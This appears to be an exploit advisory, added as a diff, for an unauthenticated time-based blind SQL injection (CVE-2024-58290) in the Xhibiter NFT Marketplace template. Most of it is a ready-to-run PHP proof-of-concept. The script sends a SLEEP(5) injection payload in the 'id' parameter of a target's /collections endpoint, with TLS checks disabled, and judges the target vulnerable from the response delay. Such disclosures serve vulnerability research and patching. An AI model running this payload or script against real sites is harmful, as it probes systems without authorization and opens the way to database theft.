@@ -1,0 +1,96 @@
+=============================================================================================================================================
+| # Title     : Xhibiter NFT Marketplace <= 1.10.2 Unauthenticated Time-Based SQL Injection                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://themeforest.net/item/xhibiter-nft-marketplace-html-template/36542347                                                |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214186/ & CVE-2024-58290
+
+[+] Summary    :  A time-based blind SQL injection vulnerability exists in the "id" parameter of the /collections endpoint in Xhibiter NFT Marketplace. An unauthenticated
+                  attacker can inject arbitrary SQL queries, leading to database interaction confirmation via delay-based payloads.
+
+
+[+] Usage : php poc.php --url=http://target/xhibiter
+
+[+] POC :
+
+<?php
+
+
+if (php_sapi_name() !== 'cli') {
+    die("Run this script from CLI only.\n");
+}
+
+function banner() {
+    echo "
+##########################################################
+#   CVE-2024-58290 - Xhibiter SQL Injection Detector     #
+#                PHP Poc by indoushka                    #
+##########################################################
+";
+}
+
+function checkVulnerability($baseUrl) {
+
+    $endpoint = rtrim($baseUrl, '/') . "/collections";
+
+    // Time-Based SQL Injection Payload
+    $payload = "1' AND (SELECT 5678 FROM (SELECT(SLEEP(5)))DwVr) AND '1'='1";
+
+    $query = http_build_query([
+        'id' => $payload
+    ]);
+
+    $url = $endpoint . "?" . $query;
+
+    echo "[*] Target URL: {$endpoint}\n";
+    echo "[*] Testing for SQL Injection (Time-Based)...\n";
+
+    $start = microtime(true);
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 15,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
+    ]);
+
+    curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+
+    $end = microtime(true);
+    $duration = $end - $start;
+
+    if ($error) {
+        echo "[!] CURL Error: {$error}\n";
+        return;
+    }
+
+    if ($duration >= 5) {
+        echo "\n[+] SUCCESS: Target is VULNERABLE to CVE-2024-58290\n";
+        echo "[+] Response delay: " . round($duration, 2) . " seconds\n";
+        echo "[+] Database executed SLEEP(5)\n";
+    } else {
+        echo "\n[-] FAILED: Target does not appear vulnerable\n";
+        echo "[-] Response time: " . round($duration, 2) . " seconds\n";
+    }
+}
+
+$options = getopt("", ["url:"]);
+
+if (!isset($options['url'])) {
+    echo "Usage: php poc.php --url=http://target/xhibiter\n";
+    exit;
+}
+
+banner();
+checkVulnerability($options['url']);
+
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
